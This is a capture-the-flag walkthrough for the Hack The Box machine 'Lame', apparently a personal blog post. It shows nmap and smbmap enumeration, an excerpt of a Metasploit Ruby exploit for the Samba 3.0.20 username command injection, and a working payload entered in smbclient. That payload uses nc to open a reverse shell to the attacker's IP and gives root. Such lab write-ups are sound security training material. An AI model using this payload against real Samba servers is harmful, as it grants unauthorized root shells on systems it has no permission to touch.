---
title: "HTB - Lame"
categories: [box]
date: 2022-12-05
comments: true
image: /images/walkthroughs/hackthebox/lame/logo.png
favicon: /images/walkthroughs/hackthebox/lame/logo.png
description: HTB - Lame walkthrough
---

# Lame 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/lame/banner.png" width="70%"/>
</p>

## Summary

Lame is an easy box where we have a vulnerable version of Samba. We can inject commands on the username login parameter. Checking the exploit, we can craft our payload and get a revshell as root user to get all flags. Also it is vulnerable to CVE-2004-2687, but we could only get a shell as daemon user (get the user flag), but I will not cover that path in this write-up.


## Enumeration

- nmap

```bash
Nmap scan report for 10.129.228.43
Host is up (0.043s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-12-05T07:16:00-05:00
|_clock-skew: mean: 2h30m27s, deviation: 3h32m10s, median: 25s
```

We have real old version from Samba, plus the nmap output is telling us that anonymous login is allowed. I always run smbmap to retrieve the shares and their access permissions:

- smbmap

```bash
smbmap -H 10.129.228.43            
[+] IP: 10.129.228.43:445       Name: 10.129.228.43                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

We have R/W over the _tmp_ share, I try to connect into the share with anonymous login and it works:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/lame/1_2_smb.png" width="80%"/>
</p>


Looking for a Samba exploit we found one for that especific version, let's take a look at the code:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/lame/2_0_exploit.png" width="90%"/>
</p>


```ruby
def exploit

    connect

    # lol?
    username = "/=`nohup " + payload.encoded + "`"
    begin
      simple.client.negotiate(false)
      simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
    rescue ::Timeout::Error, XCEPT::LoginError
      # nothing, it either worked or it didn't ;)
    end

    handler
  end
```

We can see that there is a command injection in the username argument. Let's test it out:


<p align="center">
  <img src="/images/walkthroughs/hackthebox/lame/2_1_test.png" width="70%"/>
</p>

And we get an incomming HTTP GET request, therefore we have correctly injected a command. Now we try to create a revshell.


```bash
smb: \> logon "/=`nohup nc 10.10.14.2 5456 -e /bin/bash`"
Password:  whateveryouwannainput  

session setup failed: NT_STATUS_LOGON_FAILURE 
smb: \> 
```

And we got the revshell as root!

<p align="center">
  <img src="/images/walkthroughs/hackthebox/lame/3_0_root.png" width="75%"/>
</p>

Now we can grab the root and user flag.